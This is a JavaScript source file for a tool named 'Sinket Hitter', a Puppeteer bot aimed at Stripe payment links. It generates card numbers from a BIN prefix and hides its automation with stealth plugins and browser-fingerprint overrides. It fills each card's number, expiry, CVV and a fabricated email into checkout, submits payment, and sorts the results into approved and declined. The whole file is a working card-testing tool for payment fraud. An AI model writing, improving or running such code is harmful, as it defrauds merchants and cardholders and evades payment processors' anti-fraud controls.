/**
 * Sinket Hitter - Stripe Automation Engine
 * Real success/error detection with detailed feedback
 */

const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { EventEmitter } = require('events');
const CardEngine = require('./card-engine');

puppeteer.use(StealthPlugin());

class StripeHitter extends EventEmitter {
    constructor() {
        super();
        this.browser = null;
        this.page = null;
        this.isRunning = false;
        this.results = {
            total: 0,
            success: 0,
            failed: 0,
            cards: []
        };
    }

    async start(config) {
        const { 
            paymentLink, 
            bin, 
            quantity, 
            delay, 
            autoRefresh,
            cardType,
            fillDetails 
        } = config;
        
        this.isRunning = true;
        this.results = { total: 0, success: 0, failed: 0, cards: [] };

        this.emit('status', { 
            message: '🔧 Launching stealth browser...', 
            step: 'browser-launch',
            progress: 5
        });

        // Launch browser with stealth
        this.browser = await puppeteer.launch({
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--no-first-run',
                '--no-zygote',
                '--disable-gpu',
                '--disable-blink-features=AutomationControlled',
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process',
                '--window-size=1920,1080'
            ],
            executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || null
        });

        this.emit('status', { 
            message: '✅ Browser ready', 
            step: 'browser-ready',
            progress: 10
        });

        // Generate cards
        const engine = new CardEngine();
        let cards = [];
        
        if (bin && bin.length >= 6) {
            this.emit('status', { 
                message: `🎲 Generating ${quantity} cards with BIN ${bin}...`, 
                step: 'generating-cards',
                progress: 15
            });
            
            const generated = engine.generateFromBIN(bin, quantity, cardType);
            cards = generated.cards;
            
            this.emit('status', { 
                message: `✅ Generated ${cards.length} ${generated.cardName} cards`, 
                step: 'cards-ready',
                cardType: generated.cardName,
                progress: 20
            });
        } else {
            this.emit('status', { 
                message: '⚠️ No BIN provided, using test cards', 
                step: 'using-test-cards',
                progress: 20
            });
            cards = engine.getTestCards('visa').slice(0, quantity);
        }

        this.results.total = cards.length;

        // Process each card
        for (let i = 0; i < cards.length && this.isRunning; i++) {
            const card = cards[i];
            
            this.emit('progress', {
                current: i + 1,
                total: cards.length,
                cardNumber: card.formattedNumber || card.number,
                cardBrand: card.brand,
                progress: Math.round(((i + 1) / cards.length) * 80) + 20
            });

            try {
                const result = await this.processCard(paymentLink, card, fillDetails);
                
                // Store result
                this.results.cards.push({
                    card: card,
                    result: result
                });

                if (result.success) {
                    this.results.success++;
                } else {
                    this.results.failed++;
                }

                this.emit('card-result', {
                    index: i + 1,
                    card: {
                        number: card.formattedNumber || card.number,
                        brand: card.brand,
                        expiry: card.expiry,
                        cvv: card.cvv,
                        holderName: card.holderName
                    },
                    success: result.success,
                    message: result.message,
                    details: result.details,
                    timestamp: new Date().toISOString()
                });

                // Check for session expiry
                if (result.sessionExpired) {
                    this.emit('session-expired', {
                        card: card.number,
                        message: 'Payment session expired'
                    });
                    
                    if (autoRefresh) {
                        this.emit('status', {
                            message: '⏰ Session expired - waiting for new link...',
                            step: 'session-expired',
                            needsNewLink: true
                        });
                        break;
                    }
                }

            } catch (error) {
                this.results.failed++;
                this.results.cards.push({
                    card: card,
                    result: { success: false, error: error.message }
                });

                this.emit('card-result', {
                    index: i + 1,
                    card: {
                        number: card.formattedNumber || card.number,
                        brand: card.brand
                    },
                    success: false,
                    message: `Error: ${error.message}`,
                    error: true,
                    timestamp: new Date().toISOString()
                });
            }

            // Delay between cards
            if (i < cards.length - 1 && this.isRunning) {
                await this.sleep(delay);
            }
        }

        // Complete
        this.emit('complete', {
            message: '🎯 Hitting complete!',
            step: 'complete',
            progress: 100,
            stats: {
                total: this.results.total,
                success: this.results.success,
                failed: this.results.failed,
                successRate: this.results.total > 0 
                    ? Math.round((this.results.success / this.results.total) * 100) 
                    : 0
            },
            results: this.results.cards,
            timestamp: new Date().toISOString()
        });

        await this.stop();
    }

    async processCard(paymentLink, card, fillDetails) {
        this.page = await this.browser.newPage();
        
        // Set viewport and user agent
        await this.page.setViewport({ width: 1920, height: 1080 });
        await this.page.setUserAgent(
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        );

        // Inject anti-detection
        await this.page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
            window.chrome = { runtime: {} };
            window.Notification = { permission: 'default' };
        });

        try {
            // Navigate to payment page
            this.emit('status', { 
                message: `🌐 Navigating to payment page...`, 
                step: 'navigating',
                cardLast4: card.number.slice(-4)
            });

            await this.page.goto(paymentLink, { 
                waitUntil: 'networkidle2', 
                timeout: 45000 
            });

            // Wait for page to fully load
            await this.sleep(2000);

            // Check for session expiry
            const sessionStatus = await this.checkSessionStatus();
            
            if (sessionStatus.expired) {
                return {
                    success: false,
                    sessionExpired: true,
                    message: '❌ Payment session expired',
                    details: { reason: 'session_expired' }
                };
            }

            // Fill card details
            this.emit('status', { 
                message: '💳 Filling card details...', 
                step: 'filling-card',
                cardLast4: card.number.slice(-4)
            });

            const cardFilled = await this.fillCardDetails(card);
            
            if (!cardFilled) {
                return {
                    success: false,
                    message: '❌ Could not fill card details',
                    details: { reason: 'fill_failed' }
                };
            }

            // Fill customer details if enabled
            if (fillDetails) {
                this.emit('status', { 
                    message: '👤 Filling customer details...', 
                    step: 'filling-customer',
                    cardLast4: card.number.slice(-4)
                });
                await this.fillCustomerDetails(card.holderName);
            }

            // Submit payment
            this.emit('status', { 
                message: '📤 Submitting payment...', 
                step: 'submitting',
                cardLast4: card.number.slice(-4)
            });

            const submitResult = await this.submitPayment();

            await this.page.close();
            this.page = null;

            return submitResult;

        } catch (error) {
            if (this.page) {
                try { await this.page.close(); } catch (e) {}
                this.page = null;
            }
            throw error;
        }
    }

    async fillCardDetails(card) {
        const cardNumber = card.number;
        const expiry = card.expiry;
        const cvv = card.cvv;

        // Strategy 1: Try Stripe Elements iframe
        try {
            const frames = this.page.frames();
            for (const frame of frames) {
                const frameUrl = frame.url();
                if (frameUrl.includes('stripe') || frameUrl.includes('elements')) {
                    // Try card number
                    const cardInput = await frame.$('input[name="cardnumber"], input[placeholder*="card" i], input[autocomplete="cc-number"]');
                    if (cardInput) {
                        await cardInput.click();
                        await cardInput.type(cardNumber, { delay: 30 });
                        
                        // Expiry
                        const expInput = await frame.$('input[name="exp-date"], input[placeholder*="MM" i], input[autocomplete="cc-exp"]');
                        if (expInput) {
                            await expInput.click();
                            await expInput.type(expiry, { delay: 30 });
                        }
                        
                        // CVC
                        const cvcInput = await frame.$('input[name="cvc"], input[placeholder*="CVC" i], input[autocomplete="cc-csc"]');
                        if (cvcInput) {
                            await cvcInput.click();
                            await cvcInput.type(cvv, { delay: 30 });
                        }
                        
                        return true;
                    }
                }
            }
        } catch (e) {}

        // Strategy 2: Direct inputs
        const selectors = [
            { number: 'input[name="cardnumber"], #card-number, [data-elements-stable-field-name="cardNumber"]', 
              expiry: 'input[name="exp-date"], #card-expiry, [data-elements-stable-field-name="cardExpiry"]',
              cvc: 'input[name="cvc"], #card-cvc, [data-elements-stable-field-name="cardCvc"]' },
            { number: 'input[placeholder*="card" i], input[autocomplete="cc-number"]',
              expiry: 'input[placeholder*="MM" i], input[autocomplete="cc-exp"]',
              cvc: 'input[placeholder*="CVC" i], input[autocomplete="cc-csc"]' }
        ];

        for (const strategy of selectors) {
            try {
                const numberInput = await this.page.$(strategy.number);
                if (numberInput) {
                    await numberInput.click();
                    await numberInput.type(cardNumber, { delay: 30 });
                    
                    if (strategy.expiry) {
                        const expInput = await this.page.$(strategy.expiry);
                        if (expInput) {
                            await expInput.click();
                            await expInput.type(expiry, { delay: 30 });
                        }
                    }
                    
                    if (strategy.cvc) {
                        const cvcInput = await this.page.$(strategy.cvc);
                        if (cvcInput) {
                            await cvcInput.click();
                            await cvcInput.type(cvv, { delay: 30 });
                        }
                    }
                    
                    return true;
                }
            } catch (e) {}
        }

        // Strategy 3: JavaScript injection
        try {
            await this.page.evaluate((num, exp, cv) => {
                const inputs = document.querySelectorAll('input');
                inputs.forEach(input => {
                    const ph = (input.placeholder || '').toLowerCase();
                    const name = (input.name || '').toLowerCase();
                    const auto = (input.autocomplete || '').toLowerCase();
                    
                    if ((ph.includes('card') || name.includes('card') || auto.includes('cc-number')) && 
                        !ph.includes('exp') && !ph.includes('cvc') && !ph.includes('name')) {
                        input.value = num;
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                    }
                    if (ph.includes('mm') || ph.includes('exp') || name.includes('exp') || auto.includes('cc-exp')) {
                        input.value = exp;
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                    }
                    if (ph.includes('cvc') || ph.includes('cvv') || name.includes('cvc') || auto.includes('cc-csc')) {
                        input.value = cv;
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                    }
                });
            }, cardNumber, expiry, cvv);
            
            return true;
        } catch (e) {
            return false;
        }
    }

    async fillCustomerDetails(holderName) {
        const email = this.generateEmail(holderName);
        
        const fields = [
            { selector: 'input[type="email"], input[name="email"], input[autocomplete="email"]', value: email },
            { selector: 'input[name="name"], input[autocomplete="name"]', value: holderName },
            { selector: 'input[name="cardholder-name"], input[placeholder*="name" i]', value: holderName },
            { selector: 'input[name="billing-name"]', value: holderName }
        ];

        for (const field of fields) {
            try {
                const element = await this.page.$(field.selector);
                if (element) {
                    await element.click();
                    await element.type(field.value, { delay: 20 });
                    await this.sleep(100);
                }
            } catch (e) {}
        }
    }

    async submitPayment() {
        const submitSelectors = [
            'button[type="submit"]',
            'button.SubmitButton',
            'button[class*="submit" i]',
            'button[class*="pay" i]',
            'button:has-text("Pay")',
            'button:has-text("Submit")',
            'button:has-text("Complete")',
            'button:has-text("Continue")',
            '[data-testid="submit-button"]'
        ];

        for (const selector of submitSelectors) {
            try {
                let button;
                if (selector.includes(':has-text')) {
                    const text = selector.match(/"([^"]+)"/)[1];
                    const buttons = await this.page.$x(`//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), '${text.toLowerCase()}')]`);
                    if (buttons.length > 0) button = buttons[0];
                } else {
                    button = await this.page.$(selector);
                }

                if (button) {
                    await button.click();
                    break;
                }
            } catch (e) {}
        }

        // Wait for result
        await this.sleep(4000);

        // Check result
        return await this.analyzeResult();
    }

    async analyzeResult() {
        const pageContent = await this.page.evaluate(() => {
            const text = document.body.innerText.toLowerCase();
            const html = document.body.innerHTML;
            
            return {
                text: text,
                hasSuccessIndicator: text.includes('success') || 
                                     text.includes('thank you') || 
                                     text.includes('confirmed') ||
                                     text.includes('payment successful') ||
                                     text.includes('order confirmed') ||
                                     text.includes('complete') ||
                                     document.querySelector('.success, .Success, [data-testid="success"]') !== null,
                hasErrorIndicator: text.includes('declined') || 
                                   text.includes('card was declined') ||
                                   text.includes('your card was declined') ||
                                   text.includes('incorrect') ||
                                   text.includes('invalid') ||
                                   text.includes('expired') ||
                                   text.includes('insufficient funds') ||
                                   text.includes('lost') ||
                                   text.includes('stolen') ||
                                   text.includes('processing error') ||
                                   document.querySelector('.error, .Error, [data-testid="error"]') !== null,
                errorMessage: text.match(/(card was declined|incorrect|invalid|expired|insufficient funds|processing error)[^.]*/i)?.[0] || null
            };
        });

        if (pageContent.hasSuccessIndicator && !pageContent.hasErrorIndicator) {
            return {
                success: true,
                message: '✅ Payment successful!',
                details: { 
                    status: 'success',
                    indicator: 'success_message_found'
                }
            };
        }

        if (pageContent.hasErrorIndicator) {
            const errorMsg = pageContent.errorMessage || 'Card declined';
            return {
                success: false,
                message: `❌ ${errorMsg.charAt(0).toUpperCase() + errorMsg.slice(1)}`,
                details: { 
                    status: 'declined',
                    reason: errorMsg,
                    indicator: 'error_message_found'
                }
            };
        }

        // Ambiguous result
        return {
            success: false,
            message: '⚠️ Result unclear - may need manual verification',
            details: { 
                status: 'unknown',
                pageText: pageContent.text.substring(0, 500)
            }
        };
    }

    async checkSessionStatus() {
        return await this.page.evaluate(() => {
            const text = document.body.innerText.toLowerCase();
            return {
                expired: text.includes('expired') || 
                         text.includes('session expired') ||
                         text.includes('no longer available') ||
                         text.includes('invalid session') ||
                         text.includes('link has expired'),
                valid: text.includes('pay') || 
                       text.includes('checkout') ||
                       text.includes('card') ||
                       text.includes('payment')
            };
        });
    }

    async checkLinkStatus(url) {
        const browser = await puppeteer.launch({
            headless: 'new',
            args: ['--no-sandbox', '--disable-setuid-sandbox']
        });
        
        try {
            const page = await browser.newPage();
            await page.goto(url, { waitUntil: 'networkidle2', timeout: 20000 });
            
            const status = await page.evaluate(() => {
                const text = document.body.innerText.toLowerCase();
                return {
                    expired: text.includes('expired') || 
                             text.includes('no longer available') ||
                             text.includes('invalid'),
                    valid: text.includes('pay') || 
                           text.includes('checkout') ||
                           text.includes('card'),
                    preview: document.body.innerText.substring(0, 200)
                };
            });
            
            await browser.close();
            return status;
        } catch (error) {
            await browser.close();
            return { error: error.message, expired: true };
        }
    }

    generateEmail(name) {
        const cleanName = name.toLowerCase().replace(/\s+/g, '.');
        const domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com'];
        const domain = domains[Math.floor(Math.random() * domains.length)];
        const random = Math.floor(Math.random() * 9999);
        return `${cleanName}.${random}@${domain}`;
    }

    async stop() {
        this.isRunning = false;
        
        if (this.page) {
            try { await this.page.close(); } catch (e) {}
            this.page = null;
        }
        
        if (this.browser) {
            try { await this.browser.close(); } catch (e) {}
            this.browser = null;
        }
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

module.exports = StripeHitter;
